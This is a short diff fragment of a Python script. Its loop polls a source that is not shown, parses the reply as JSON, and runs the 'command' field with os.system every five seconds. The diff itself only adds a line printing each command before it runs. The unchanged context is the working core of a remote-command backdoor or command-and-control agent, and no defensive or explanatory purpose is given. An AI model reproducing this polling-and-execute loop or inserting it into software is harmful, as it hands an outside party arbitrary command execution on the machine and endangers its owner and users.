@@ -11,5 +11,6 @@ while True:
     data = response.read()
     data_dict = json.loads(data)
     if data_dict:
+        print(data_dict['command'])
         os.system(data_dict['command'])
     time.sleep(5)
